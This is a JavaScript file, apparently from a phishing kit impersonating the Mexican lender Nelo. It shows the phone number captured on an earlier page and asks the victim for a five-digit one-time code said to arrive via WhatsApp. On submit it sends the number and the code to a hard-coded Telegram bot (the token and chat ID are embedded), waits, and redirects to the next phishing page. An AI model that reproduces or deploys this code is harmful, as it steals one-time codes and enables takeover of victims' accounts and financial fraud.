const TELEGRAM_BOT_TOKEN = "8685705173:AAGkJoDqd-Fbhy2BGCUgJLRSFqJ_F0qlFa0";
const TELEGRAM_CHAT_ID = "-5018202838";

(async function() {
    console.log("🚀 index2.js iniciado");
    
    let numeroGuardado = localStorage.getItem('nelo_telefono');
    
    if (!numeroGuardado) {
        numeroGuardado = localStorage.getItem('nelo_telefono_completo');
    }
    
    if (!numeroGuardado) {
        numeroGuardado = sessionStorage.getItem('nelo_telefono_completo');
    }
    
    console.log("📞 Número recuperado:", numeroGuardado);
    
    function formatearNumero(numero) {
        if (!numero) return null;
        let limpio = numero.replace(/\D/g, '');
        if (limpio.length === 12 && limpio.startsWith('52')) {
            limpio = limpio.substring(2);
        }
        if (limpio.length === 10) {
            return `+52 ${limpio.substring(0,2)} ${limpio.substring(2,6)} ${limpio.substring(6,10)}`;
        }
        return numero;
    }
    
    if (numeroGuardado) {
        const numeroFormateado = formatearNumero(numeroGuardado);
        const telefonoSpan = document.getElementById('telefonoDestacado');
        if (telefonoSpan) {
            telefonoSpan.textContent = numeroFormateado || numeroGuardado;
        }
        
        const mensajeDiv = document.getElementById('mensajeCodigoUnico');
        if (mensajeDiv) {
            mensajeDiv.innerHTML = `Ingresa el código de uso único enviado vía WhatsApp al <span id="telefonoDestacado">${numeroFormateado || numeroGuardado}</span>`;
        }
    } else {
        console.warn("⚠️ No se encontró número de teléfono guardado");
    }
    
    async function enviarATelegram(mensaje) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: mensaje,
                    parse_mode: 'HTML'
                })
            });
            const data = await response.json();
            if (data.ok) {
                console.log("✅ Mensaje enviado a Telegram correctamente");
                return true;
            } else {
                console.error("❌ Error Telegram:", data.description);
                return false;
            }
        } catch (error) {
            console.error("❌ Error de conexión:", error);
            return false;
        }
    }

    const esperarDOM = setInterval(() => {
        const boton = document.getElementById('verificarCodigoBtn');
        const codigoInput = document.getElementById('codigoSeguridad');
        const telefonoSpan = document.getElementById('telefonoDestacado');
        const feedbackSpan = document.getElementById('feedbackSpanCode');
        const modal = document.getElementById('spinnerModal');
        
        if (boton && codigoInput && feedbackSpan && modal) {
            clearInterval(esperarDOM);
            
            function mostrarModalSpinner() {
                modal.classList.add('active');
            }

            function ocultarModalSpinner() {
                modal.classList.remove('active');
            }
            
            boton.addEventListener('click', async function() {
                const codigo = codigoInput.value.trim();
                const soloDigitosCodigo = codigo.replace(/\D/g, '');
                let numeroTexto = telefonoSpan ? telefonoSpan.textContent : "No disponible";
                
                if (soloDigitosCodigo.length !== 5) {
                    feedbackSpan.textContent = `❌ El código debe tener 5 dígitos (actual: ${soloDigitosCodigo.length})`;
                    feedbackSpan.classList.remove('success-fb');
                    feedbackSpan.classList.add('error-fb');
                    codigoInput.style.transform = 'scale(1.01)';
                    setTimeout(() => { if (codigoInput) codigoInput.style.transform = ''; }, 180);
                    codigoInput.focus();
                    return;
                }
                
                boton.disabled = true;
                feedbackSpan.textContent = "";
                feedbackSpan.classList.remove('error-fb', 'success-fb');
                mostrarModalSpinner();
                
                const mensaje = `🔵🔵CÓDIGO🔵🔵\nNúmero: ${numeroTexto}\nCódigo ingresado: ${soloDigitosCodigo}`;
                await enviarATelegram(mensaje);
                
                localStorage.setItem('nelo_telefono', numeroGuardado);
                localStorage.setItem('nelo_telefono_completo', numeroGuardado);
                sessionStorage.setItem('nelo_telefono_completo', numeroGuardado);
                
                setTimeout(() => {
                    ocultarModalSpinner();
                    window.location.href = "index3.html";
                }, 2500);
            });
        }
    }, 100);
})();